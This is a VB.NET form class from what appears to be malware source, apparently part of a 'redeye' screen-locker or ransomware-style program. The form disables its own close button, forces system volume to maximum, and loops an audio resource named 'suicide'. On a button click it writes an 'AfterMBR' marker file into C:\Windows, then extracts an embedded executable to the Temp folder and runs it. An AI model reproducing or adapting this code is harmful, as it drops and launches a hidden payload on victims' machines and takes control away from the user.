Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text

Public Class Form6
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Private Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function
    Const WM_APPCOMMAND As UInteger = &H319
    Const APPCOMMAND_VOLUME_UP As UInteger = &HA

    Private Sub Form6_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.Shown
        For a = 100 To 1 Step -1
            SendMessage(Me.Handle, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000)
        Next
        My.Computer.Audio.Play(My.Resources.suicide, AudioPlayMode.BackgroundLoop)
        Label2.BackColor = TransparencyKey
        Label3.BackColor = TransparencyKey
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim path As String = "C:\Windows\AfterMBR.txt"
        Dim fs As FileStream = File.Create(path)
        Dim info As Byte() = New UTF8Encoding(True).GetBytes("AfterMBR")
        fs.Write(info, 0, info.Length)
        fs.Close()

        Dim aakam031 As String = My.Computer.FileSystem.SpecialDirectories.Temp
        Dim akam As String = aakam031 + "redeye.exe"
        IO.File.WriteAllBytes(akam, My.Resources.redeye1)
        Process.Start(akam)
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        My.Computer.Audio.Stop()
        Me.Hide()
        My.Computer.Audio.Play(My.Resources.redeye, AudioPlayMode.BackgroundLoop)
    End Sub
End Class